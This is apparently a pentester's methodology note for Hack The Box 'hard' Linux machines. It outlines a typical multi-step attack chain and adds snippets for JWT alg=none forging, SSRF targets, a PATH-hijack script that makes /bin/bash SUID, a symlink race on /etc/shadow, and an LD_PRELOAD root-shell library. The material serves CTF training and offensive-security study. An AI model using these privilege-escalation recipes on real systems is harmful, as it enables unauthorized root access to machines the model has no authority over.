---
tags: [pentest, htb, linux, hard-box, walkthrough-pattern, both]
type: workflow
---
# Linux Hard Box - Walkthrough Pattern

[[00 - README|Folder index]]

Hard Linux boxes layer 3-5 steps before root. Patterns:

## Hallmarks

- Multi-step foothold (web app vuln A → cred → service B → cred → shell)
- Custom service running on a non-standard port
- Source code reading required (PHP/Node/Python/Go - read the actual logic)
- Lateral movement between 2-3 users on the same box
- Priv-esc via a less obvious vector: race condition, custom SUID, library hijack, ld.so, kernel CVE

## Typical chain

```text
1. Recon + vhost fuzzing reveals 2-3 subdomains
2. Find /api on one subdomain, /admin on another
3. Auth bypass on /api (often JWT alg=none, weak secret, or IDOR)
4. Use the leaked token / cred to authenticate to /admin
5. /admin has a CRUD form → upload, SSRF, or RCE feature
6. Initial shell as a service user (e.g. apache, app, deploy)
7. Service user has access to a SECOND internal service (e.g. internal Tomcat on 127.0.0.1:8080)
8. Pivot/proxy + exploit internal service → user 2 (with shell)
9. User 2 has sudo on a custom script OR a quirky binary - read it carefully
10. Root via the quirky binary's input parsing flaw / TOCTOU / wildcard
```

## Skills you'll use on hard Linux

### Source code review

When you find any source-readable artifact (`.php`, `.py`, `.js`, `.go`, `.rb`), READ IT. The vulnerability is often in plain sight - a `os.system()` with concatenated input, an `eval()`, a `pickle.loads()`, a `Marshal.load()`, a missing `escape()`.

```bash
# Common review queries
grep -RinE "exec\(|system\(|eval\(|popen\(|passthru\(|shell_exec\(" /var/www
grep -RinE "pickle\.loads|yaml\.load[^_]|Marshal\.load" /opt
grep -RinE "sudo|setuid|root" *.{c,sh,py,php} 2>/dev/null
```

### JWT manipulation

```bash
# Decode
jwt-cli decode <token>
# or: echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null

# Sign with `none`
# Edit header to {"alg":"none","typ":"JWT"}, payload as desired, signature empty

# Brute the secret (HS256)
hashcat -m 16500 jwt.txt rockyou.txt
```

### Server-side request forgery (SSRF) deep

```text
- Internal services on 127.0.0.1 / 169.254.169.254 (cloud metadata)
- gopher://, file://, dict:// protocols
- DNS rebinding for filters that block by IP
- ssrf to authenticate against an internal SMB / Redis / Memcached via gopher://
```

### Custom binary priv-esc

When you find a SUID binary that isn't in GTFOBins:

```bash
# Identify
file /usr/local/bin/customsetuid
strings /usr/local/bin/customsetuid | head -40
ltrace /usr/local/bin/customsetuid 2>&1 | head
strace /usr/local/bin/customsetuid 2>&1 | head

# Look for:
#   - system() / execve() with relative path  → PATH hijack
#   - unsanitized argv parsing  → command injection
#   - format string bug         → leak/overwrite
#   - buffer overflow on argv   → ROP (rare on hard, expected on insane)

# If it calls another binary by relative path:
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/fake
chmod +x /tmp/fake
export PATH=/tmp:$PATH
/usr/local/bin/customsetuid
/bin/bash -p
```

### Race conditions / TOCTOU

When a script does `[ -O file ] && cat file` or `[ writable ] && chmod`:

```bash
while true; do ln -sf /etc/shadow /tmp/target 2>/dev/null; done &
# Then trigger the script
```

### ld.so / LD_PRELOAD / LD_LIBRARY_PATH

```bash
# When sudo allows env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH:
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so <allowed-bin>
```

### Library hijack (custom binary linking to /lib/.../libfoo.so)

```bash
ldd /usr/local/bin/customsetuid
# If a lib lives in a writable path: compile a shim and drop it there.
```

## Hard-box mindset

- Treat each shell as a checkpoint, not the win.
- After each new user, **re-enumerate from that perspective** - they have access you didn't.
- Read `~/.bash_history`, `~/.viminfo`, `~/.lesshst`, `~/.recently-used`, browser history, mail spool.
- Look for *services* the new user can administer that the old user couldn't.

> [!tip] Hard boxes reward patience
> If you've spent 4+ hours without progress, the issue is enumeration. Sleep on it. Try again with fresh eyes. The clue is on the box.
